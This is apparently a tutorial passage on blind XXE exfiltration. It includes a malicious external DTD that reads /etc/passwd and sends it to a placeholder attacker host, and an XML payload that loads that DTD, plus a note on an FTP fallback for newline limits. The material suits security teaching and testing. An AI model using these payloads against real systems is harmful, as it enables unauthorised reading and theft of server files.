Exfiltrating sensitive data in blind XXE is hard but not possible. This can be achieved by hosting a malicious DTD on a system that an attacker controls and then invoking it within the XXE payload. An example of a malicious DTD to exfiltrate contents of `/etc/passwd`:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

The attacker must then host the malicious DTD on a system they control. For example, the attacker might serve it at the following URL: `https://web-attacker.com/malicious.dtd`.

Finally, the attacker must submit the following XXE payload to the vulnerable application:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>299</productId></stockCheck>
```
## Note
This technique might not work with some file contents, including the newline characters. This is because some XML parsers fetch the URL defined in the external entity using an API that validates the whitelisted characters against the URL string. In this situation, it might possible to use the FTP protocol instead. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as `/etc/hostname` can be targeted instead.